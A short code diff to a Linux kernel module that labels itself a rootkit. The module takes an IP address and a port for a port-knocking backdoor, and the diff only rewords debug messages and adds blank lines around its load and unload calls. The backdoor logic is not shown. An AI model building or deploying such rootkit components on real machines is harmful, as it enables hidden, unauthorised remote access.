@@ -16,6 +16,8 @@ static char input_ip[16];
 module_param_string(ipv4, input_ip, 16, 0);
 static int port_number;
 module_param(port_number, int, 0);
+
+
 /*
  * Function called when loading the kernel module.
  * Prints a welcome-message and then does its magic.
@@ -32,12 +34,13 @@ int init_module (void)
 	
 	if(ret == 0 || port_number<0 || port_number>65535)
 	{
-		ROOTKIT_DEBUG("Invalid IP-address or port number. Please enter data.\n");
+		ROOTKIT_DEBUG("Invalid IP-address or port number. Please enter the data correctly.\n");
 		return -EINVAL;
 	}
 	
 	load_port_knocking(input_ip, (unsigned)port_number);
 	
+	ROOTKIT_DEBUG("Done.\n");
 	return 0;
 }
 
@@ -48,8 +51,11 @@ int init_module (void)
  */
 void cleanup_module (void)
 {
+	ROOTKIT_DEBUG("Starting to unload...\n");
+
+
 	unload_port_knocking();
 	
 	/* Finally, log the unloading */
-	ROOTKIT_DEBUG("Unloading port-knocker... bye!\n");
+	ROOTKIT_DEBUG("Done. Bye!\n");
 }
